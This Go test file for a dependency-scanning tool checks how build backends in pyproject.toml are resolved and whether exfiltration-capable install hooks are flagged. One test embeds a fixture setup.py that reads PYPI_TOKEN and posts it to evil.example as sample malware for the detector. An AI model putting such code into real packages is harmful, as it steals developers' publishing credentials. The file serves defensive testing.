package pypi

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"testing"

	"ihbv.io/depsnort/internal/check"
	"ihbv.io/depsnort/internal/check/builtin"
	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/installsurface"
	"ihbv.io/depsnort/internal/purl"
)

func consumerNode() (*graph.Graph, *graph.Node) {
	g := graph.New()
	id := purl.NewPyPI("consumer-project", "1.0.0").String()
	n := g.AddNode(&graph.Node{ID: id, Ecosystem: "pypi", Name: "consumer-project", Version: "1.0.0", Depth: 0})
	g.MarkRoot(id)
	return g, n
}

// A malicious build backend pinned exactly must be recursively fetched and
// analyzed as its own package node — including having VC-002 fire on ITS
// node, not the consumer's, since the hook is the backend's code, not the
// project that merely declared it.
func TestResolveBuildBackendMaliciousPinnedBlocks(t *testing.T) {
	pyproject := `
[build-system]
requires = ["evil-backend==1.2.3"]
build-backend = "evil_backend.api"
`
	maliciousSetupPy := `
import os
import requests
token = os.environ['PYPI_TOKEN']
requests.post('https://evil.example/collect', data=token)
`
	tgz := gzipBytes(t, makeTar(t, [][2]string{
		{"evil-backend-1.2.3/setup.py", maliciousSetupPy},
	}))
	sum := sha256.Sum256(tgz)
	jsonURL := "https://pypi.org/pypi/evil-backend/1.2.3/json"
	sdistURL := "https://files.pythonhosted.org/evil-backend-1.2.3.tar.gz"

	a := &Adapter{Sdist: fetcherWith(map[string][]byte{
		jsonURL:  []byte(jsonWithSdist(sdistURL, hex.EncodeToString(sum[:]), int64(len(tgz)))),
		sdistURL: tgz,
	})}

	g, consumer := consumerNode()
	processed := map[string]bool{}
	var gaps instsurf.Gaps
	a.resolveBuildBackend(context.Background(), g, consumer, pyproject, processed, &gaps)
	if err := gaps.Err(); err != nil {
		t.Fatalf("resolveBuildBackend produced a gap: %v", err)
	}

	backendID := purl.NewPyPI("evil-backend", "1.2.3").String()
	backendNode := g.Get(backendID)
	if backendNode == nil {
		t.Fatal("backend node was not created")
	}
	if backendNode.Attr["pypi.role"] != "build-backend" {
		t.Errorf("backend node missing pypi.role=build-backend, got %+v", backendNode.Attr)
	}

	var sawBuildBackendEdge, hookOnBackend, hookOnConsumer bool
	for _, e := range g.SortedEdges() {
		if e.From == consumer.ID && e.To == backendID && e.Type == graph.EdgeBuildBackend {
			sawBuildBackendEdge = true
		}
		if e.Type == graph.EdgeDeclaresHook {
			if e.From == backendID {
				hookOnBackend = true
			}
			if e.From == consumer.ID {
				hookOnConsumer = true
			}
		}
	}
	if !sawBuildBackendEdge {
		t.Error("expected a consumer -> backend EdgeBuildBackend edge")
	}
	if !hookOnBackend {
		t.Error("expected the malicious setup.py hook to be declared by the backend node")
	}
	if hookOnConsumer {
		t.Error("the hook must NOT be attributed to the consumer node")
	}

	ctx := &check.Context{Graph: g}
	var found bool
	for _, f := range (builtin.HookExfilCapable{}).Run(ctx) {
		if f.NodeID == backendID {
			found = true
		}
	}
	if !found {
		t.Error("VC-002d must fire on the backend's own node ID")
	}
}

// A backend declared in build-backend but absent from build-system.requires
// cannot be safely resolved to a version — MatchBuildBackendRequires already
// disclosed this via the hook's evidence, so no node or edge is created here.
func TestResolveBuildBackendMissingRequiresEntryCreatesNothing(t *testing.T) {
	pyproject := `
[build-system]
requires = ["some-other-package==1.0.0"]
build-backend = "evil_backend.api"
`
	a := &Adapter{Sdist: fetcherWith(nil)}
	g, consumer := consumerNode()
	before := g.Len()
	processed := map[string]bool{}
	var gaps instsurf.Gaps
	a.resolveBuildBackend(context.Background(), g, consumer, pyproject, processed, &gaps)

	if g.Len() != before {
		t.Errorf("g.Len() = %d, want unchanged %d (no node should be created)", g.Len(), before)
	}
	if len(g.Edges) != 0 {
		t.Errorf("expected no edges, got %v", g.Edges)
	}

	// The hook itself (built from the exact same pyproject.toml, via the
	// public AnalyzePython entry point) is what discloses WHY resolution
	// declined — resolveBuildBackend does not duplicate that disclosure.
	surface := installsurface.AnalyzePython("", pyproject, nil)
	if len(surface.Hooks) != 1 {
		t.Fatalf("expected 1 hook, got %d", len(surface.Hooks))
	}
	var sawMissing bool
	for _, e := range surface.Hooks[0].Evidence {
		if e == "missing-requires-entry" {
			sawMissing = true
		}
	}
	if !sawMissing {
		t.Errorf("expected missing-requires-entry evidence, got %v", surface.Hooks[0].Evidence)
	}
}

// An unpinned build-system.requires entry (the common real-world case, e.g.
// "evil-backend>=1.0") cannot be resolved to one concrete version without
// reimplementing a resolver (D-01) — it registers as an ordinary unresolved
// dependency and no node/edge is created.
func TestResolveBuildBackendUnpinnedRecordsUnresolved(t *testing.T) {
	pyproject := `
[build-system]
requires = ["evil-backend>=1.0"]
build-backend = "evil_backend.api"
`
	a := &Adapter{Sdist: fetcherWith(nil)}
	g, consumer := consumerNode()
	before := g.Len()
	processed := map[string]bool{}
	var gaps instsurf.Gaps
	a.resolveBuildBackend(context.Background(), g, consumer, pyproject, processed, &gaps)

	if g.Len() != before {
		t.Errorf("g.Len() = %d, want unchanged %d (no node should be created)", g.Len(), before)
	}
	if len(g.Edges) != 0 {
		t.Errorf("expected no edges, got %v", g.Edges)
	}
	if consumer.Attr[graph.AttrUnresolved] != "evil-backend" {
		t.Errorf("%s = %q, want %q", graph.AttrUnresolved, consumer.Attr[graph.AttrUnresolved], "evil-backend")
	}
	if consumer.Attr[graph.AttrUnresolvedCount] != "1" {
		t.Errorf("%s = %q, want \"1\"", graph.AttrUnresolvedCount, consumer.Attr[graph.AttrUnresolvedCount])
	}
}
